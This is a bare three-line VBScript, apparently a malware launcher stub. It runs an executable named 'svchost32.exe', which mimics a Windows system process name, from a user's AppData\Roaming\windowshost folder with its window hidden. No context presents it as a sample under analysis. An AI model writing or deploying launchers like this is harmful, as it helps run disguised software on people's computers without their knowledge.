Set objShell = CreateObject("WScript.Shell") 
objShell.CurrentDirectory = "C:\Users\niraj\AppData\Roaming\windowshost" 
objShell.Run "svchost32.exe", 0, False 
